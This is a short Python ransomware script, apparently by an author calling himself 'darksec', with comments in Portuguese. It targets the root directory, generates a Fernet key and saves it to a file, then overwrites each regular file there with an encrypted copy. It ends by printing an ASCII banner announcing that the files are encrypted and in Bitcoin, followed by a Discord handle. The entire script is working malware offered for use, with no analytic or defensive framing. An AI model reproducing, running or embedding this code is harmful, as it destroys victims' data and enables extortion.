#!/usr/bin/env python3
#DEVELOPER DARKSEC
#=======================================
import os
from cryptography.fernet import Fernet
#======================================

#DIRETORIO ALVO:

diretorio_alvo = "/"

os.chdir(diretorio_alvo)

# ENCRIPTANDO DADOS
files = []

for file in os.listdir():
	if file == "ransomware.py" or file == "chave.key" or file == "decrypted.py":
		continue
	if os.path.isfile(file):
		files.append(file)

key = Fernet.generate_key()

with open("chave.key", "wb") as thekey:
	thekey.write(key)

for file in files:
	with open(file, "rb") as thefile:
		content = thefile.read()
	content_encrypted = Fernet(key).encrypt(content)
	with open(file, "wb") as thefile:
		thefile.write(content_encrypted)

print (" __   __ __  _  _ ___   ___ _ _   ___   ___ __  _  ________   _____ _____ ___ __   ")
print (" \ `v' //__\| || | _ \ | __| | | | __| | __|  \| |/ _/ _ \ `v' / _,\_   _| __| _\  ")
print ("  `. .'| \/ | \/ | v / | _|| | |_| _|  | _|| | ' | \_| v /`. .'| v_/ | | | _|| v | ")
print ("   !_!  \__/ \__/|_|_\ |_| |_|___|___| |___|_|\__|\__/_|_\ !_! |_|   |_| |___|__/  ")
print ("                                                                                   ")
print ("    | | |  \| | __| __| _\  |  \ |_   _/ _//__\| |  \| |/' _/ ")
print ("    | | | | ' | _|| _|| v | | -< | | || \_| \/ | | | ' |`._`. ")
print ("    |_| |_|\__|___|___|__/  |__/_| |_| \__/\__/|_|_|\__||___/ ")
print ("                 									")
print ("											")
print (" 			| MY DISCORD : darksec_ |")
